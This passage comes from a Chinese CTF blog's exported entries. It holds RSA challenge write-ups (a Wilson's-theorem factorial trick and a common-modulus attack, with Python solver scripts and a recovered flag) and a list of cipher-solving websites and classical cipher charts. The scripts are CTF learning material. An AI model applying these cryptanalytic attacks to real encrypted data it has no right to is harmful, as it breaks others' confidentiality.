xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>之后，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>之前的所有数相乘</p><p>那么此时的公式就可以转变成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">!</mo><mo>∗</mo><mi>k</mi><mo>≡</mo><mo>−</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>A</mi></mrow><annotation encoding="application/x-tex">B!*k\equiv-1\mod{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span></span></span></span></p><p>找到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>的逆元，就可以求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mo stretchy="false">!</mo><mo>≡</mo><mo>−</mo><msup><mi>k</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>A</mi></mrow><annotation encoding="application/x-tex">B!\equiv-k^{-1}\mod{A}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span></span></span></span></p><p>这样就可以省很多计算，上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myGetPrime</span>(<span class="hljs-params">A,B</span>):<br>    k=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(B+<span class="hljs-number">1</span>,A):<br>        k=k*i%A<br>    x=gmpy2.invert(k,A)<br>    xB=-x%A<br>    <span class="hljs-keyword">return</span> sympy.nextprime(xB)<br><br>A1=<span class="hljs-number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span><br>B1=<span class="hljs-number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span><br>p=myGetPrime(A1,B1)<br><br>A2=<span class="hljs-number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span><br>B2=<span class="hljs-number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span><br>q=myGetPrime(A2,B2)<br><br>n=<span class="hljs-number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span><br><br>r=(n//p)//q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)<br>e=<span class="hljs-number">0x1001</span><br>d=gmpy2.invert(e,phi)<br>c=<span class="hljs-number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span><br><br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>flag=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="RSA-what">RSA &amp; what</h2><p>这道题也不算难，但是最后有个base64隐写之前没见过，吸取线下赛经验，把它记到博客上。</p><p>首先题目给出了四个文件</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/RSA&amp;What_1.png" alt="RSA&amp;What_1"></p><p>看给出的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> powmod<br><br>p = getPrime(<span class="hljs-number">2048</span>)<br>q = getPrime(<span class="hljs-number">2048</span>)<br>N = p*q<br>Phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_enc_key</span>(<span class="hljs-params">N,Phi</span>):<br>    e = getPrime(N)<br>    <span class="hljs-keyword">if</span> Phi % e == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> get_enc_key(N, Phi)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> e<br>e1 = get_enc_key(randint(<span class="hljs-number">10</span>, <span class="hljs-number">12</span>), Phi)<br>e2 = get_enc_key(randint(<span class="hljs-number">10</span>, <span class="hljs-number">12</span>), Phi)<br><br>fr = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./base64&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<span class="hljs-comment">#flag is in this file</span><br>f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./HUB1&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./HUB2&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>base64 = fr.read(<span class="hljs-number">255</span>)<br>f1.write(<span class="hljs-string">&quot;%d\n%d\n&quot;</span> % (N, e1))<br>f2.write(<span class="hljs-string">&quot;%d\n%d\n&quot;</span> % (N, e2))<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(base64)&gt;<span class="hljs-number">0</span>:<br>    pt = bytes_to_long(base64)<br>    ct1 = powmod(pt, e1, N)<br>    ct2 = powmod(pt, e2, N)<br>    f1.write(<span class="hljs-string">&quot;\n%d&quot;</span> % ct1)<br>    f2.write(<span class="hljs-string">&quot;\n%d&quot;</span> % ct2)<br>    base64 = fr.read(<span class="hljs-number">255</span>)<br>fr.close()<br>f1.close()<br>f2.close()<br></code></pre></td></tr></table></figure><p>很明显这里用了相同的模数N和两个公钥，加密得出了多个密文，都存放在HUB1和HUB2中，考虑共模攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> powmod<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> primefac<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">same_n_attack</span>(<span class="hljs-params">n,e1,e2,c1,c2</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">egcd</span>(<span class="hljs-params">a,b</span>):<br>         x, lastX = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>         y, lastY = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>         <span class="hljs-keyword">while</span> (b != <span class="hljs-number">0</span>):<br>             q = a // b<br>             a, b = b, a % b<br>             x, lastX = lastX - q * x, x<br>             y, lastY = lastY - q * y, y<br>         <span class="hljs-keyword">return</span> (lastX, lastY)<br>    s = egcd(e1,e2)<br>    s1 = s[<span class="hljs-number">0</span>]<br>    s2 = s[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> s1 &lt; <span class="hljs-number">0</span>:<br>        s1 = -s1<br>        c1 = primefac.modinv(c1, n)<br>        <span class="hljs-keyword">if</span> c1 &lt; <span class="hljs-number">0</span>:<br>            c1 += n<br>    <span class="hljs-keyword">elif</span> s2 &lt; <span class="hljs-number">0</span>:<br>        s2 = -s2<br>        c2 = primefac.modinv(c2, n)<br>        <span class="hljs-keyword">if</span> c2 &lt; <span class="hljs-number">0</span>:<br>            c2 += n<br>    m = (<span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n)) % n<br>    <span class="hljs-keyword">return</span> m<br><br><span class="hljs-keyword">import</span> gmpy2<br>f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./HUB1&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).readlines()<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;./HUB2&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).readlines()<br>n=<span class="hljs-built_in">int</span>(f1[<span class="hljs-number">0</span>])<br>e1=<span class="hljs-built_in">int</span>(f1[<span class="hljs-number">1</span>])<br>e2=<span class="hljs-built_in">int</span>(f2[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(e1,e2)<br>c=<span class="hljs-string">&#x27;&#x27;</span><br>gcd, s, t = gmpy2.gcdext(e1, e2)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(f2)):<br>    message1 = <span class="hljs-built_in">int</span>(f1[i])<br>    message2 = <span class="hljs-built_in">int</span>(f2[i])<br>    plain = same_n_attack(n,e1,e2,message1,message2)<br>    c=long_to_bytes(plain)<br>    flag+=<span class="hljs-built_in">str</span>(c)<br><span class="hljs-built_in">print</span>()<br>flag = flag[<span class="hljs-number">2</span>:-<span class="hljs-number">2</span>].split(<span class="hljs-string">&#x27;\\n&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(base64.b64decode(i).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>),end=<span class="hljs-string">&#x27; &#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到一串字符串</p><p><img src="buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/RSA&amp;What_2.png" alt="2"></p><p>同时会报错</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/RSA&amp;What_2.png" alt="RSA&amp;What_2"></p><p>一开始不知道为什么报错。输出一下报错的那段密文转换过来的值</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/RSA&amp;What_4.png" alt="RSA&amp;What_4"></p><p>这里卡了很久，还以为题目出问题了。之后上网搜索才发现是因为这道题就是这样出的，它用了base64隐写，<a href="https://.com.cn">base64</a>的隐写发在这里了。</p><p>直接用脚本就可以，最后得到7c86d8f7d6de33a87f7f9d6b005ce640，包上flag{}提交</p>]]></content>
    
    
    
    <tags>
      
      <tag>刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些做题经验</title>
    <link href="/2023/05/07/%E4%B8%80%E4%BA%9B%E5%81%9A%E9%A2%98%E7%BB%8F%E9%AA%8C/"/>
    <url>/2023/05/07/%E4%B8%80%E4%BA%9B%E5%81%9A%E9%A2%98%E7%BB%8F%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="md5网站">md5网站</h1><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><h1 id="替换密码爆破">替换密码爆破</h1><p><a href="https://quipqiup.com/">https://quipqiup.com/</a></p><h1 id="Rsa大素因数分解">Rsa大素因数分解</h1><p><a href="http://www.factordb.com/">http://www.factordb.com/</a></p><h1 id="与佛论禅">与佛论禅</h1><p>两种不同的加密方式，但是最后都得到一串佛文，遇到了最好两个网站都试一试</p><ul><li>旧与佛论禅<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">https://www.keyfc.net/bbs/tools/tudoucode.aspx</a></li><li>新约佛论禅<a href="http://hi.pcmoe.net/Buddha.html">http://hi.pcmoe.net/Buddha.html</a></li></ul><h1 id="维吉尼亚爆破（已无法使用）">维吉尼亚爆破（已无法使用）</h1><p><a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p><h1 id="RSA的pem格式转换（python实现）">RSA的pem格式转换（python实现）</h1><p>pem转正常格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> Crypto.PublicKey.RSA<br>n=<span class="hljs-number">0</span><br>e=<span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\Users\yz\Desktop\题目\ISCC\misc\guss_rsa\publickey.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    key = Crypto.PublicKey.RSA.importKey(f.read())<br>    n = key.n<br>    e = key.e<br></code></pre></td></tr></table></figure><h2 id="tar文件">tar文件</h2><p>遇到tar文件可以直接进入cmd窗口，输入</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta">#首先切换到你想要把它解压的地方，例如我想解压到d盘：</span><br><span class="hljs-meta">#直接在cmd中输入：</span><br><span class="hljs-symbol">d:</span><span class="hljs-meta">#回车</span><br>tar -xvf filename<span class="hljs-meta">#直接复制过来就好了</span><br></code></pre></td></tr></table></figure><h1 id="奇奇怪怪的密码">奇奇怪怪的密码</h1><p>做密码题或者杂项题老是遇到一些奇奇怪怪的密码，记录一下积累的密码</p><h1 id="图形密码">图形密码</h1><h2 id="猪圈密码">猪圈密码</h2><p>这个很常见，直接贴图</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E7%8C%AA%E5%9C%88%E5%AF%86%E7%A0%81.jpg" alt="猪圈密码"></p><h2 id="圣堂武士密码-猪圈变形1">圣堂武士密码-猪圈变形1</h2><p>猪圈密码的变形</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%9C%A3%E5%A0%82.jpg" alt="圣堂"></p><h2 id="银河密码">银河密码</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E9%93%B6%E6%B2%B3.jpg" alt="银河"></p><h2 id="福尔摩斯–跳舞的小人">福尔摩斯–跳舞的小人</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E8%B7%B3%E8%88%9E.jpg" alt="跳舞"></p><h2 id="精灵语">精灵语</h2><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E7%B2%BE%E7%81%B5%E8%AF%AD.png" alt="精灵语"></p><h1 id="猪圈变形2">猪圈变形2</h1><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E7%8C%AA%E5%9C%882.png" alt="猪圈2"></p><h1 id="猪圈变形3">猪圈变形3</h1><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E7%8C%AA%E5%9C%883.png" alt="猪圈3"></p><h1 id="夏多密码">夏多密码</h1><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/%E5%A4%8F%E5%A4%9A.png" alt="夏多"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
